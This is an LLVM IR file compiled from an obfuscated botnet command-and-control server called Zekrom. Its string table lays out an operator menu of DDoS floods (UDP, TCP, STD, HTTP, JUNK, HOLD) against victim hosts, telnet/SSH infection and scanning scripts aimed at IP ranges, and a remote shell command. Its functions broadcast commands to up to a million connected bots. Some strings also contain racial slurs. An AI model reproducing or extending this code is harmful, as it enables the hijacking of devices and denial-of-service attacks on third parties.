; ModuleID = 'host/ir_sub/Zekrom.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.telnetdata_t, [8 x i8] }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[33m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"\0D\0A\1B[31m> \1B[0m\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.118 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.17 = private unnamed_addr constant [33 x i8] c"%c]0;BOT COUNT: %d| NIGGAS: %d%c\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@accounts = internal global [10 x %struct.login_info] zeroinitializer, align 16
@.str.20 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@.str.21 = private unnamed_addr constant [21 x i8] c"\1B[30mUsername:\1B[30m \00", align 1
@.str.23 = private unnamed_addr constant [21 x i8] c"\1B[30mPassword:\1B[30m \00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [28 x i8] c"\1B[31mWRONG ANSWER BITCH!!\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [107 x i8] c"\1B[31m _\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD_   _\EF\BF\BD\EF\BF\BD\EF\BF\BD____  _\EF\BF\BD\EF\BF\BD_ \EF\BF\BD  _\EF\BF\BD\EF\BF\BD_\EF\BF\BD\EF\BF\BD\EF\BF\BD_  _\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD_   _\EF\BF\BD\EF\BF\BD_ _\EF\BF\BD_\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [97 x i8] c"\1B[31m\EF\BF\BD     _\EF\BF\BD \EF\BF\BD  _\EF\BF\BD   \EF\BF\BD \EF\BF\BD  \EF\BF\BD _\EF\BF\BD \EF\BF\BD   \EF\BF\BD   \EF\BF\BD \EF\BF\BD      \EF\BF\BD \EF\BF\BD  \EF\BF\BD \EF\BF\BD  \EF\BF\BD\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [99 x i8] c"\1B[31m\EF\BF\BD __\EF\BF\BD\EF\BF\BD     \EF\BF\BD_____  \EF\BF\BD  \EF\BF\BD\EF\BF\BD_  \EF\BF\BD  \EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD  \EF\BF\BD      \EF\BF\BD \EF\BF\BD  \EF\BF\BD    \EF\BF\BD\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [85 x i8] c"\1B[31m  \EF\BF\BD        \EF\BF\BD    \EF\BF\BD    \EF\BF\BD   \EF\BF\BD  _\EF\BF\BD    \EF\BF\BD  \EF\BF\BD_    _\EF\BF\BD   \EF\BF\BD    \EF\BF\BD \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [89 x i8] c"\1B[31m   \EF\BF\BD____\EF\BF\BD _\EF\BF\BD____   _\EF\BF\BD   \EF\BF\BD  \EF\BF\BD     \EF\BF\BD     \EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD   _\EF\BF\BD   _\EF\BF\BD  \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [81 x i8] c"\1B[31m       \EF\BF\BD  \EF\BF\BD    \EF\BF\BD   \EF\BF\BD    \EF\BF\BD  \EF\BF\BD     \EF\BF\BD            \EF\BF\BD    \EF\BF\BD   \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [71 x i8] c"\1B[31m          \EF\BF\BD        \EF\BF\BD                          \EF\BF\BD    \EF\BF\BD   \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [39 x i8] c"\0D\0A\1B[34m\09\09~[\1B[31mWelcome, %s\1B[34m  ]~\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [41 x i8] c"\1B[34m\09\09~[\1B[31mBOT COUNT: %d\1B[34m\09   ]~\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [13 x i8] c"\1B[32m> \1B[37m\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.37 = private unnamed_addr constant [29 x i8] c"BOT COUNT: %d | NIGGAS: %d\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"STATUS\00", align 1
@.str.39 = private unnamed_addr constant [41 x i8] c"TELNET DEVICES: %d | TELNET STATUS: %d\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [6 x i8] c"STATS\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"INFECT\00", align 1
@.str.42 = private unnamed_addr constant [30 x i8] c"python telnet.py filtered.txt\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"REINFECT\00", align 1
@.str.44 = private unnamed_addr constant [29 x i8] c"python w.py filtered_ssh.txt\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"FILTER\00", align 1
@.str.46 = private unnamed_addr constant [93 x i8] c"sort telnet.txt | uniq -u>>filtered_telnet.txt;sort infected.txt | uniq -u>>filtered_ssh.txt\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"LOAD\00", align 1
@.str.48 = private unnamed_addr constant [29 x i8] c"python scan.py 376 LOAD 88 1\00", align 1
@.str.49 = private unnamed_addr constant [6 x i8] c"SCAN1\00", align 1
@.str.50 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.92 lol\00", align 1
@.str.51 = private unnamed_addr constant [6 x i8] c"SCAN2\00", align 1
@.str.52 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.93 lol\00", align 1
@.str.53 = private unnamed_addr constant [6 x i8] c"SCAN3\00", align 1
@.str.54 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.25 1\00", align 1
@.str.55 = private unnamed_addr constant [6 x i8] c"SCAN4\00", align 1
@.str.56 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.26 1\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"SCAN5\00", align 1
@.str.58 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.27\091\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"SCAN6\00", align 1
@.str.60 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 113.53 1\00", align 1
@.str.61 = private unnamed_addr constant [6 x i8] c"SCAN7\00", align 1
@.str.62 = private unnamed_addr constant [31 x i8] c"python scan.py 376 B 180.180 1\00", align 1
@.str.63 = private unnamed_addr constant [6 x i8] c"SCAN8\00", align 1
@.str.64 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 185.52 1\00", align 1
@.str.65 = private unnamed_addr constant [6 x i8] c"LUCKY\00", align 1
@.str.66 = private unnamed_addr constant [30 x i8] c"python scan.py 376 LUCKY 88 1\00", align 1
@.str.67 = private unnamed_addr constant [7 x i8] c"LUCKY2\00", align 1
@.str.68 = private unnamed_addr constant [31 x i8] c"python scan.py 376 LUCKY2 88 1\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"SCAN_OFF\00", align 1
@.str.70 = private unnamed_addr constant [18 x i8] c"killall -9 python\00", align 1
@.str.71 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.72 = private unnamed_addr constant [29 x i8] c"\0D\0A\1B[31m~[ATTACK COMMANDS]~\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [62 x i8] c"\1B[31m~[\1B[37mUDP\1B[31m]~ \1B[37m!* UDP Victim Port Time 32 0 10\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [66 x i8] c"\1B[31m~[\1B[37mTCP\1B[31m]~ \1B[37m!* TCP Victim Port Time 32 all 0 10\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [54 x i8] c"\1B[31m~[\1B[37mSTD\1B[31m]~ \1B[37m!* STD Victim Port Time\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [48 x i8] c"\1B[31m~[\1B[37mHTTP\1B[31m]~ \1B[37m!* HTTP Url Time\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [56 x i8] c"\1B[31m~[\1B[37mJUNK\1B[31m]~ \1B[37m!* JUNK Victim Port Time\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [56 x i8] c"\1B[31m~[\1B[37mHOLD\1B[31m]~ \1B[37m!* HOLD Victim Port Time\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [50 x i8] c"\1B[31m~[\1B[37mKILL\1B[31m]~ \1B[37m!* KILLATTK | KILL\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [29 x i8] c"\1B[31m~[SCANNING COMMANDS]~\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [36 x i8] c"\1B[31m~[\1B[37mLOAD\1B[31m]~ \1B[37mLOAD\0D\0A\00", align 1
@.str.82 = private unnamed_addr constant [61 x i8] c"\1B[31m~[\1B[37mSCAN\1B[31m]~ \1B[37mSCAN1 | SCAN2 | SCAN3 | SCAN4\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [61 x i8] c"\1B[31m~[\1B[37mSCAN\1B[31m]~ \1B[37mSCAN5 | SCAN6 | SCAN7 | SCAN8\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [47 x i8] c"\1B[31m~[\1B[37mLUCKY\1B[31m]~ \1B[37mLUCKY | LUCKY2\0D\0A\00", align 1
@.str.85 = private unnamed_addr constant [40 x i8] c"\1B[31m~[\1B[37mSTOP\1B[31m]~ \1B[37mSCAN_OFF\0D\0A\00", align 1
@.str.86 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mGENERAL COMMANDS\1B[31m]~\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mSHELL\1B[31m]~ \1B[37m!* SH\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [46 x i8] c"\1B[31m~[\1B[37mBOTS\1B[31m]~ \1B[37m!* BOTS | BOTS\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [52 x i8] c"\1B[31m~[\1B[37mSTATUS\1B[31m]~ \1B[37m!* STATUS | STATUS\0D\0A\00", align 1
@.str.90 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mSTATS\1B[31m]~ \1B[37mSTATS\0D\0A\00", align 1
@.str.91 = private unnamed_addr constant [35 x i8] c"\1B[31m~[\1B[37mMISC COMMANDS\1B[31m]~\0D\0A\00", align 1
@.str.92 = private unnamed_addr constant [49 x i8] c"\1B[31m~[\1B[37mINECTION FILTER\1B[31m]~ \1B[37mFILTER\0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [47 x i8] c"\1B[31m~[\1B[37mTELNET INFECT\1B[31m]~ \1B[37mINFECT\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [49 x i8] c"\1B[31m~[\1B[37mREINFECT BOTS\1B[31m]~ \1B[37mREINFECT\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [44 x i8] c"\1B[31m~[\1B[37mCLEARSCREEN\1B[31m]~ \1B[37mCLEAR\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [40 x i8] c"\1B[31m~[\1B[37mLOGOUT\1B[31m]~ \1B[37mLOGOUT\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.98 = private unnamed_addr constant [14 x i8] c"!* KILLATTK\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"Bye, %s\00", align 1
@.str.103 = private unnamed_addr constant [12 x i8] c"\1B[31m> \1B[0m\00", align 1
@.str.104 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.105 = private unnamed_addr constant [15 x i8] c"server_log.txt\00", align 1
@.str.106 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.107 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.108 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.109 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.110 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.112 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.113 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.114 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.116 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.117 = private unnamed_addr constant [4 x i8] c"LEL\00", align 1
@.str.119 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.120 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.121 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %40

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add i32 %35, 1497183874
  %37 = add i32 %36, 1
  %38 = sub i32 %37, 1497183874
  %39 = add nsw i32 %35, 1
  store i32 %38, i32* %7, align 4
  br label %9

; <label>:40:                                     ; preds = %25
  %41 = load i32, i32* %8, align 4
  ret i32 %41
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 2058048883215521376
  %9 = sub i64 %8, 1
  %10 = add i64 %9, 2058048883215521376
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #8
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %28

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 %23, -1483191768
  %25 = add i32 %24, 1
  %26 = add i32 %25, -1483191768
  %27 = add nsw i32 %23, 1
  store i32 %26, i32* %4, align 4
  br label %13

; <label>:28:                                     ; preds = %13
  br label %29

; <label>:29:                                     ; preds = %44, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %42

; <label>:33:                                     ; preds = %29
  %34 = load i8*, i8** %2, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = call i32 @isspace(i32 %39) #8
  %41 = icmp ne i32 %40, 0
  br label %42

; <label>:42:                                     ; preds = %33, %29
  %43 = phi i1 [ false, %29 ], [ %41, %33 ]
  br i1 %43, label %44, label %50

; <label>:44:                                     ; preds = %42
  %45 = load i32, i32* %5, align 4
  %46 = sub i32 %45, -125686026
  %47 = add i32 %46, -1
  %48 = add i32 %47, -125686026
  %49 = add nsw i32 %45, -1
  store i32 %48, i32* %5, align 4
  br label %29

; <label>:50:                                     ; preds = %42
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %3, align 4
  br label %52

; <label>:52:                                     ; preds = %70, %50
  %53 = load i32, i32* %3, align 4
  %54 = load i32, i32* %5, align 4
  %55 = icmp sle i32 %53, %54
  br i1 %55, label %56, label %77

; <label>:56:                                     ; preds = %52
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* %3, align 4
  %64 = load i32, i32* %4, align 4
  %65 = sub i32 0, %64
  %66 = add i32 %63, %65
  %67 = sub nsw i32 %63, %64
  %68 = sext i32 %66 to i64
  %69 = getelementptr inbounds i8, i8* %62, i64 %68
  store i8 %61, i8* %69, align 1
  br label %70

; <label>:70:                                     ; preds = %56
  %71 = load i32, i32* %3, align 4
  %72 = sub i32 0, %71
  %73 = sub i32 0, 1
  %74 = add i32 %72, %73
  %75 = sub i32 0, %74
  %76 = add nsw i32 %71, 1
  store i32 %75, i32* %3, align 4
  br label %52

; <label>:77:                                     ; preds = %52
  %78 = load i8*, i8** %2, align 8
  %79 = load i32, i32* %3, align 4
  %80 = load i32, i32* %4, align 4
  %81 = sub i32 %79, -1270652763
  %82 = sub i32 %81, %80
  %83 = add i32 %82, -1270652763
  %84 = sub nsw i32 %79, %80
  %85 = sext i32 %83 to i64
  %86 = getelementptr inbounds i8, i8* %78, i64 %85
  store i8 0, i8* %86, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

; <label>:17:                                     ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = sub i64 %19, 8555203750289782538
  %21 = add i64 %20, 10
  %22 = add i64 %21, 8555203750289782538
  %23 = add i64 %19, 10
  %24 = call noalias i8* @malloc(i64 %22) #7
  store i8* %24, i8** %8, align 8
  %25 = load i8*, i8** %8, align 8
  %26 = load i8*, i8** %4, align 8
  %27 = call i64 @strlen(i8* %26) #8
  %28 = sub i64 0, %27
  %29 = sub i64 0, 10
  %30 = add i64 %28, %29
  %31 = sub i64 0, %30
  %32 = add i64 %27, 10
  call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 %31, i32 1, i1 false)
  %33 = load i8*, i8** %8, align 8
  %34 = load i8*, i8** %4, align 8
  %35 = call i8* @strcpy(i8* %33, i8* %34) #7
  %36 = load i8*, i8** %8, align 8
  call void @trim(i8* %36)
  %37 = call i64 @time(i64* %9) #7
  %38 = call %struct.tm* @localtime(i64* %9) #7
  store %struct.tm* %38, %struct.tm** %10, align 8
  %39 = load %struct.tm*, %struct.tm** %10, align 8
  %40 = call i8* @asctime(%struct.tm* %39) #7
  store i8* %40, i8** %11, align 8
  %41 = load i8*, i8** %11, align 8
  call void @trim(i8* %41)
  store i32 0, i32* %12, align 4
  br label %42

; <label>:42:                                     ; preds = %111, %17
  %43 = load i32, i32* %12, align 4
  %44 = icmp slt i32 %43, 1000000
  br i1 %44, label %45, label %117

; <label>:45:                                     ; preds = %42
  %46 = load i32, i32* %12, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp eq i32 %46, %47
  br i1 %48, label %66, label %49

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %12, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %51
  %53 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %52, i32 0, i32 1
  %54 = load i8, i8* %53, align 4
  %55 = icmp ne i8 %54, 0
  br i1 %55, label %67, label %56

; <label>:56:                                     ; preds = %49
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %66, label %59

; <label>:59:                                     ; preds = %56
  %60 = load i32, i32* %12, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %61
  %63 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %62, i32 0, i32 0
  %64 = load i32, i32* %63, align 4
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %67, label %66

; <label>:66:                                     ; preds = %59, %56, %45
  br label %111

; <label>:67:                                     ; preds = %59, %49
  %68 = load i32, i32* %7, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %87

; <label>:70:                                     ; preds = %67
  %71 = load i32, i32* %12, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %72
  %74 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %73, i32 0, i32 0
  %75 = load i32, i32* %74, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %87

; <label>:77:                                     ; preds = %70
  %78 = load i32, i32* %12, align 4
  %79 = call i64 @send(i32 %78, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i64 5, i32 16384)
  %80 = load i32, i32* %12, align 4
  %81 = load i8*, i8** %6, align 8
  %82 = load i8*, i8** %6, align 8
  %83 = call i64 @strlen(i8* %82) #8
  %84 = call i64 @send(i32 %80, i8* %81, i64 %83, i32 16384)
  %85 = load i32, i32* %12, align 4
  %86 = call i64 @send(i32 %85, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  br label %87

; <label>:87:                                     ; preds = %77, %70, %67
  %88 = load i32, i32* %12, align 4
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i32 0, i32 0), i32 %88)
  %90 = load i32, i32* %12, align 4
  %91 = load i8*, i8** %4, align 8
  %92 = load i8*, i8** %4, align 8
  %93 = call i64 @strlen(i8* %92) #8
  %94 = call i64 @send(i32 %90, i8* %91, i64 %93, i32 16384)
  %95 = load i32, i32* %7, align 4
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %107

; <label>:97:                                     ; preds = %87
  %98 = load i32, i32* %12, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %99
  %101 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %100, i32 0, i32 0
  %102 = load i32, i32* %101, align 4
  %103 = icmp ne i32 %102, 0
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %97
  %105 = load i32, i32* %12, align 4
  %106 = call i64 @send(i32 %105, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i32 0, i32 0), i64 13, i32 16384)
  br label %110

; <label>:107:                                    ; preds = %97, %87
  %108 = load i32, i32* %12, align 4
  %109 = call i64 @send(i32 %108, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0), i64 1, i32 16384)
  br label %110

; <label>:110:                                    ; preds = %107, %104
  br label %111

; <label>:111:                                    ; preds = %110, %66
  %112 = load i32, i32* %12, align 4
  %113 = sub i32 %112, 1112504625
  %114 = add i32 %113, 1
  %115 = add i32 %114, 1112504625
  %116 = add nsw i32 %112, 1
  store i32 %115, i32* %12, align 4
  br label %42

; <label>:117:                                    ; preds = %42
  %118 = load i8*, i8** %8, align 8
  call void @free(i8* %118) #7
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
